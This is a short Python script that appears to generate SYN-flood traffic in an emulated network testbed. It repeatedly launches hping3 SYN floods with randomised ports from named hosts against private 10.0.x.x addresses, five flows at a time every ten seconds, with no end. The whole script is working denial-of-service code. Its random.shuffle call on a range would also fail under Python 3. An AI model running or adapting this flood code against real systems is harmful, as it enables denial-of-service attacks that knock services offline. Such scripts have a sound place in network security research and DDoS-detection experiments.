
import multiprocessing
import os 
import threading
import time
import sys
import random
import subprocess
import traceback
import tempfile
from more_itertools import distinct_permutations
import multiprocessing
import signal

from concurrent.futures import ThreadPoolExecutor


class Attack_flow():
    host_id=""
    dst_ip=""
    pid=0
    proc=None


    def __init__(self,host_id,dst_ip):
        # threading.Thread.__init__(self)
        self.dst_ip=dst_ip
        self.host_id=host_id


    # def run(self):
    #     os.system("./host-cmd "+self.host_id+" hping3 -S -p ++ -i u10000 -d 2000 -V  "+self.dst_ip)


    # def run(self):
    #     os.system("./host-cmd "+self.host_id+" hping3 -S -p ++ -i u32000 -d 346 -V  "+self.dst_ip)  
    def run(self):
        cmd="./host-cmd "+self.host_id+" hping3 -S -p ++ -i u108146 -d 1300 -V  "+self.dst_ip 
        subprocess.Popen(cmd,shell=True)








def main():

    thread_pool = ThreadPoolExecutor(max_workers=20)

    n=5
    attack_flow_arr=[]
    id_arr=[]
    last_id_arr=[]
    host_id_arr=["h01","h01","h11","h11","h12","h21","h21"]

    dst_ip_arr=["10.0.3.32","10.0.3.31","10.0.3.31","10.0.4.41","10.0.4.42","10.0.4.42","10.0.4.41"]

    for i in range(len(host_id_arr)):
        attack_flow=Attack_flow(host_id_arr[i],dst_ip_arr[i])
        attack_flow_arr.append(attack_flow)
    


    print("where")


    while(True):
        id_arr=range(7)
        random.shuffle(id_arr)
        id_arr=id_arr[0:n]
        
        for id in id_arr:
            t = threading.Thread(target=attack_flow_arr[id].run,name="job1")
            t.start()
        
        time.sleep(10)









if __name__ == "__main__":
    main()


